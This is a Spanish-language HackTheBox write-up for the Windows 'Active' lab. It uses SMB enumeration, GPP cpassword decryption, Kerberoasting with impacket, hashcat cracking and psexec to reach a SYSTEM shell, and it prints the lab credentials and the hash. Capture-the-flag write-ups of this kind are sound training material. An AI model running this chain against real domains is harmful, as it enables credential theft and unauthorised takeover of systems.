Propiedades:
- OS: Windows
- Plataforma: HackTheBox
- Nivel: Easy
- Tags: #smb #impacket #kerberoasting #psexec #sysvol

![](assets/Pasted%20image%2020260102204453.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ ping -c 1 10.129.21.103
PING 10.129.21.103 (10.129.21.103) 56(84) bytes of data.
64 bytes from 10.129.21.103: icmp_seq=1 ttl=127 time=87.8 ms

--- 10.129.21.103 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 87.769/87.769/87.769/0.000 ms
```

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/nmap]
└─$ sudo nmap -p- -Pn -n -sS --min-rate 5000 -vvv 10.129.21.103 -oG allPorts

PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5722/tcp  open  msdfsr           syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49152/tcp open  unknown          syn-ack ttl 127
49153/tcp open  unknown          syn-ack ttl 127
49154/tcp open  unknown          syn-ack ttl 127
49155/tcp open  unknown          syn-ack ttl 127
49157/tcp open  unknown          syn-ack ttl 127
49158/tcp open  unknown          syn-ack ttl 127
49162/tcp open  unknown          syn-ack ttl 127
49166/tcp open  unknown          syn-ack ttl 127
49169/tcp open  unknown          syn-ack ttl 127
```

- Un montón de puertos abiertos.

Sobre los puertos abiertos tiro un segundo escaneo para detectar versiones, servicios y correr un conjunto de scripts de reconocimiento.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/nmap]
└─$ sudo nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49166,49169 -Pn -n -sS -sV -sC -vvv 10.129.21.103 -oN target

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid:
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-01-03 02:47:35Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5722/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49153/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49154/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49155/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49157/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49162/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49166/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49169/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   2:1:0:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-01-03T02:48:31
|_  start_date: 2026-01-03T02:41:48
|_clock-skew: -4s
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 4959/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 38887/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 33561/udp): CLEAN (Timeout)
|   Check 4 (port 52925/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

Por la informacion obtenida podemos intuir que esto es un `DC`.

- Puerto 88 Kerberos.
- Puerto 389 LDAP nos indica el dominio **active.htb**
- Puerto 139,445 SMB
- Puerto 135 RPC

## Enumeración

### Puerto 445 SMB

Con `netexec` a través del servicio SMB liste informacion básica del sistema.

- Nombre de la maquina `DC`.
- Dominio **active.htb**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/nmap]
└─$ nxc smb 10.129.21.103
SMB         10.129.21.103   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
```

Podemos meter eso al `/etc/hosts`

```bash
10.129.21.103 active.htb DC.active.htb DC
```

#### Enumeracion de Shares Null Session

Enumere todos los shares a los que tengo acceso con Null session y vi lo siguiente:

- Permisos de lectura en el share **Replication**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/nmap]
└─$ nxc smb 10.129.21.103 -u '' -p '' --shares
SMB         10.129.21.103   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.21.103   445    DC               [+] active.htb\:
SMB         10.129.21.103   445    DC               [*] Enumerated shares
SMB         10.129.21.103   445    DC               Share           Permissions     Remark
SMB         10.129.21.103   445    DC               -----           -----------     ------
SMB         10.129.21.103   445    DC               ADMIN$                          Remote Admin
SMB         10.129.21.103   445    DC               C$                              Default share
SMB         10.129.21.103   445    DC               IPC$                            Remote IPC
SMB         10.129.21.103   445    DC               NETLOGON                        Logon server share
SMB         10.129.21.103   445    DC               Replication     READ
SMB         10.129.21.103   445    DC               SYSVOL                          Logon server share
SMB         10.129.21.103   445    DC               Users
```

Me conecte a **Replication** y al ver su estructura de carpetas podemos intuir que es una replica de **SYSVOL**..

- **SYSVOL** es un recurso estándar de Active Directory utilizado para distribuir políticas y scripts a todos los equipos del dominio.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ smbclient //10.129.21.103/Replication -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  active.htb                          D        0  Sat Jul 21 05:37:44 2018

                5217023 blocks of size 4096. 317716 blocks available
smb: \> cd active.htb
smb: \active.htb\> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  DfsrPrivate                       DHS        0  Sat Jul 21 05:37:44 2018
  Policies                            D        0  Sat Jul 21 05:37:44 2018
  scripts                             D        0  Wed Jul 18 13:48:57 2018

                5217023 blocks of size 4096. 317716 blocks available
```

En **SYSVOL** o en este caso en **Replication** podemos encontrar informacion critica del dominio como los **Group Policy Preferences** los cuales son archivos XML que contienen contraseñas cifradas.

- Groups.xml en: **\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>**

```bash
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\> cd Groups\
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> ls
  .                                   D        0  Sat Jul 21 05:37:44 2018
  ..                                  D        0  Sat Jul 21 05:37:44 2018
  Groups.xml                          A      533  Wed Jul 18 15:46:06 2018

                5217023 blocks of size 4096. 291079 blocks available
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.5 KiloBytes/sec) (average 1.5 KiloBytes/sec)
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\>
```

Al ver que contenía el archivo vemos lo siguiente:

- Usuario: SVC_TGS y su contraseña cifrada **cpassword=edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ**

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/loot]
└─$ cat Groups.xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

El valor `cpassword` corresponde a una **contraseña cifrada mediante AES-256**, utilizada por **Group Policy Preferences** para distribuir credenciales.

Microsoft publicó la **clave AES estática** utilizada para este cifrado, lo que permite **descifrar la contraseña de forma offline**.

Desencriptando la clave con `gpp-decrypt`

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/loot]
└─$ gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
GPPstillStandingStrong2k18
```

Credenciales: SVC_TGS/GPPstillStandingStrong2k18
#### Enumerando Shares como SVC_TGS

Enumere los shares a los que tengo acceso como el usuario SVC_TGS y me encuentro lo siguiente:

- Permisos de Lectura en los shares **Users**, NETLOGON, SYSVOL, REPLICATION.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ nxc smb 10.129.21.103 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.21.103   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.21.103   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18
SMB         10.129.21.103   445    DC               [*] Enumerated shares
SMB         10.129.21.103   445    DC               Share           Permissions     Remark
SMB         10.129.21.103   445    DC               -----           -----------     ------
SMB         10.129.21.103   445    DC               ADMIN$                          Remote Admin
SMB         10.129.21.103   445    DC               C$                              Default share
SMB         10.129.21.103   445    DC               IPC$                            Remote IPC
SMB         10.129.21.103   445    DC               NETLOGON        READ            Logon server share
SMB         10.129.21.103   445    DC               Replication     READ
SMB         10.129.21.103   445    DC               SYSVOL          READ            Logon server share
SMB         10.129.21.103   445    DC               Users           READ
```

- Enumere el share de Users pero no encontré nada, se podría decir que es una replica del file system de los usuarios, en este share podemos encontrar la flag de user pero no hay una via potencial para tener acceso a la maquina.

### Servicio RPC

Para tener un poco mas de informacion enumere los usuarios, grupos e informacion de los usuarios via RPC.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ rpcclient -U 'SVC_TGS%GPPstillStandingStrong2k18' 10.129.21.103
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[SVC_TGS] rid:[0x44f]

rpcclient $> querydispinfo
index: 0xdea RID: 0x1f4 acb: 0x00000210 Account: Administrator  Name: (null)    Desc: Built-in account for administering the computer/domain
index: 0xdeb RID: 0x1f5 acb: 0x00000215 Account: Guest  Name: (null)    Desc: Built-in account for guest access to the computer/domain
index: 0xe19 RID: 0x1f6 acb: 0x00020011 Account: krbtgt Name: (null)    Desc: Key Distribution Center Service Account
index: 0xeb2 RID: 0x44f acb: 0x00000210 Account: SVC_TGS        Name: SVC_TGS   Desc: (null)

rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Admins] rid:[0x200]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Domain Controllers] rid:[0x204]
group:[Schema Admins] rid:[0x206]
group:[Enterprise Admins] rid:[0x207]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Read-only Domain Controllers] rid:[0x209]
group:[DnsUpdateProxy] rid:[0x44e]
rpcclient $>
```

Usuarios

- Administrator
- SVC_TGS
- krbtgt
## Explotación

Utilice la herramienta **`impacket-GetUserSPNs`** para enumerar **Service Principal Names (SPNs)** asociados a cuentas de usuario del dominio, con el objetivo de identificar cuentas potencialmente vulnerables a **Kerberoasting**.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-01-02 20:42:49.726146
```

- Cuenta Administrator esta asociada al SPN `active/CIFS:445`

Al solicitar un TGS para este servicio, el KDC devolvió un ticket cifrado con una clave derivada de la contraseña del usuario, permitiendo la obtención de un hash Kerberos susceptible a **Kerberoasting**. En español (obtuvimos un hash que podemos crackear para obtener la password del usuario administrator.)

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active]
└─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 14:06:40.351723  2026-01-02 20:42:49.726146

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$56e594c7d672ed453890904a1228c633$1d12becf16a2bb529c11321b27ca8c10e2203545574570375ab26368dba6244f83dd44aaa8ee8d08606d73c33bf5f5b0abe8c46180871a748da1b73c722bdf41477662e5a9d833d033d8bba9fab2a8537fb7134580e37f1a4ece7aef5958eabf8a736ef786db123e6f5fb36b12827bc5037915ca3a3677f16d0cebcafba18c76c78d92056a2652c0eeedebb73aed2f8becbc16c87b9d8c222d73ce67fbd9079ccede54e23551d2bbf46d19b1919de332bd33907a043d17466d9de4e6f3a7019767d1995d2ff0ed8f6b28bb9af55489029f424908fe0085cc6c1a2bab85fba905a01dcc517ebabcb2e4166d74e2ee15fd55bc5567a9bb81c6c611525f6042b22a0bc2db92d9a02d1d50227b7c55fed872be998a259dd0c0a4138442bf3686f0d164a35bd3fdbe445b37fe43f52c12548a91c3a7a447b06d21b5257ca84ca67b2f2e989a92779d40af47b759721d496c661f7dd0db457fac4374f4ec5c2bb03e0abe67328025c7d50f7e59b32173c6c247ecf82a942e48eab6dbefa8da3fc54f7315de43002a56b2e619a15360071880ab85eb87b33bccde20fa8940438eac2819ba18348372a234109e90bab0f1a09df5274de6b8d744d081f90e90be46a228096b96dadeb2b086d6c02c5f5a3d45a58eca718b13055fc9c4330b6598effaf11533165512f70b35a4879cb54e38d3b84108bc06766f53a0457c7f136817a7ba7dd7d8d1120be38b079b7a8de89e3daf85cc3440f97a3a88bd97e949a0cec8ee83a3d81c753712eb581574c9f8612607ad05a863ee8fc074b190b5971292ab83a7be957a58620458f8afd00743015e188bc51d86537438ab3a16c919e0979dc6d8cf6f0a89e02be51538f5650860b66080f5fe12d37a2d12b0937dd163af530abacf88d4db14cab3e0feac6eebe455590783e28ec106ad7f8225a539ae3282d4e37f0ea67378f011ef1c7d7d05db0cf1697a3387f6ce7e9f2538495d6f59703edb343bac4a63902e36200ef3f0cd33e8e8eb0be9c953ee12e8d2f6b4c8ccc7f94249269fb5a97b401521e1b834103eca25dddaaae34c67d68066878791164ee3a552c8dcd3f0cfd2a64c49e3e5cc926565e22437f738593a0f08ac3d6fd86e7bbd233d382b70abb5d54063ed0350058fda44fcb3b08d7c015be9f517186bb5b04f256335ee06a15ff1d7a8d4bf4e72de44bd562d4b9125b0540135de490fb78a52885493de5d94356ecbaf8c9820d30a2a7bfd39f9e716bef13406
```

Utilice hashcat para crackear el hash y obtener la contraseña

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/loot]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$56e594c7d672ed453890904a1228c633$1d12becf16a2bb529c11321b27ca8c10e2203545574570375ab26368dba6244f83dd44aaa8ee8d08606d73c33bf5f5b0abe8c46180871a748da1b73c722bdf41477662e5a9d833d033d8bba9fab2a8537fb7134580e37f1a4ece7aef5958eabf8a736ef786db123e6f5fb36b12827bc5037915ca3a3677f16d0cebcafba18c76c78d92056a2652c0eeedebb73aed2f8becbc16c87b9d8c222d73ce67fbd9079ccede54e23551d2bbf46d19b1919de332bd33907a043d17466d9de4e6f3a7019767d1995d2ff0ed8f6b28bb9af55489029f424908fe0085cc6c1a2bab85fba905a01dcc517ebabcb2e4166d74e2ee15fd55bc5567a9bb81c6c611525f6042b22a0bc2db92d9a02d1d50227b7c55fed872be998a259dd0c0a4138442bf3686f0d164a35bd3fdbe445b37fe43f52c12548a91c3a7a447b06d21b5257ca84ca67b2f2e989a92779d40af47b759721d496c661f7dd0db457fac4374f4ec5c2bb03e0abe67328025c7d50f7e59b32173c6c247ecf82a942e48eab6dbefa8da3fc54f7315de43002a56b2e619a15360071880ab85eb87b33bccde20fa8940438eac2819ba18348372a234109e90bab0f1a09df5274de6b8d744d081f90e90be46a228096b96dadeb2b086d6c02c5f5a3d45a58eca718b13055fc9c4330b6598effaf11533165512f70b35a4879cb54e38d3b84108bc06766f53a0457c7f136817a7ba7dd7d8d1120be38b079b7a8de89e3daf85cc3440f97a3a88bd97e949a0cec8ee83a3d81c753712eb581574c9f8612607ad05a863ee8fc074b190b5971292ab83a7be957a58620458f8afd00743015e188bc51d86537438ab3a16c919e0979dc6d8cf6f0a89e02be51538f5650860b66080f5fe12d37a2d12b0937dd163af530abacf88d4db14cab3e0feac6eebe455590783e28ec106ad7f8225a539ae3282d4e37f0ea67378f011ef1c7d7d05db0cf1697a3387f6ce7e9f2538495d6f59703edb343bac4a63902e36200ef3f0cd33e8e8eb0be9c953ee12e8d2f6b4c8ccc7f94249269fb5a97b401521e1b834103eca25dddaaae34c67d68066878791164ee3a552c8dcd3f0cfd2a64c49e3e5cc926565e22437f738593a0f08ac3d6fd86e7bbd233d382b70abb5d54063ed0350058fda44fcb3b08d7c015be9f517186bb5b04f256335ee06a15ff1d7a8d4bf4e72de44bd562d4b9125b0540135de490fb78a52885493de5d94356ecbaf8c9820d30a2a7bfd39f9e716bef13406:Ticketmaster1968
```

- Credenciales Administrator/Ticketmaster1968

Con `impacket-psexec` es posible obtener una shell remota utilizando SMB, RPC y las credenciales del administrator:

- Nos autenticamos con credenciales validas contra el SMB.
- Se sube un binario temporal `EjHxBpRF.exe` en el share **ADMIN$**
- Se conecta al **SCM (Service Control Manager)** via **RPC** para crear y ejecutar el servicio cuyo binario fue previamente subido.

```bash
┌──(wndr㉿wndr)-[~/Machines/hackthebox/active/loot]
└─$ impacket-psexec active.htb/administrator:'Ticketmaster1968'@active.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on active.htb.....
[*] Found writable share ADMIN$
[*] Uploading file EjHxBpRF.exe
[*] Opening SVCManager on active.htb.....
[*] Creating service swNV on active.htb.....
[*] Starting service swNV.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```


***PWNED***

![](assets/Pasted%20image%2020260102213037.png)
